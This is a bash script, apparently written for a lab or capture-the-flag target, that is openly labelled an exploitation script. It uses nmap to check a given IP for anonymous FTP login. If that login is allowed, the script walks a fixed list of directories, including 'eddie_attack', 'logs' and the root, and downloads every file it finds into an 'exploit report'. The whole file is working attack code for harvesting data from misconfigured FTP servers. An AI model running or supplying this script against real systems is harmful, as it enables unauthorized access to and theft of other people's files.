#!/bin/bash

# Check if IP address argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ip_address>"
    exit 1
fi

IP="$1"

# Create a report file
EXPLOIT_REPORT="exploit_report_for_${IP}.txt"
echo "Exploit Report for $IP" >"$EXPLOIT_REPORT"
echo "-----------------------------------------" >>"$EXPLOIT_REPORT"

# Step 1: Check for anonymous login using nmap
echo "Checking for anonymous login on $IP using nmap..." | tee -a "$EXPLOIT_REPORT"
nmap -p 21 --script=ftp-anon "$IP" -oN nmap_anon_check_$IP.txt
anon_result=$(grep "Anonymous FTP login allowed" nmap_anon_check_$IP.txt)

if [ -n "$anon_result" ]; then
    echo "Anonymous login allowed on $IP" | tee -a "$EXPLOIT_REPORT"

    # Step 2: List files in readable directories and download each file
    echo "Checking for readable directories and downloading files..." | tee -a "$EXPLOIT_REPORT"

    # List of directories to try for file download
    directories=("eddie_attack" "logs" "session_logs" "stress_tests" "version_data" "/")

    for dir in "${directories[@]}"; do
        echo "Checking directory: $dir" | tee -a "$EXPLOIT_REPORT"

        # Use FTP command to list files in directory
        file_list=$(
            ftp -nv $IP <<END_FTP | tee -a "$EXPLOIT_REPORT"
        user anonymous anonymous
        ls $dir
        quit
END_FTP
        )

        # Check if listing was successful
        if echo "$file_list" | grep -q "226 Directory send OK"; then
            echo "Files found in directory $dir:" | tee -a "$EXPLOIT_REPORT"
            echo "$file_list" | tee -a "$EXPLOIT_REPORT" | grep -v "226 Directory send OK"

            # Extract file names from list
            files=$(echo "$file_list" | grep -v "226 Directory send OK" | awk '{print $NF}')

            # Download each file
            for file in $files; do
                echo "Downloading file: $file from $dir" | tee -a "$EXPLOIT_REPORT"
                ftp -nv $IP <<END_FTP >>"$EXPLOIT_REPORT"
                user anonymous anonymous
                get $dir/$file $dir/$file
                quit
END_FTP
            done
        else
            echo "No files found in directory $dir or directory not accessible." | tee -a "$EXPLOIT_REPORT"
        fi
    done

else
    echo "Anonymous login not allowed on $IP. Exploitation not possible." | tee -a "$EXPLOIT_REPORT"
fi

# Cleanup intermediate files
rm nmap_anon_check_$IP.txt

echo "Exploitation script completed. Report saved to $EXPLOIT_REPORT."
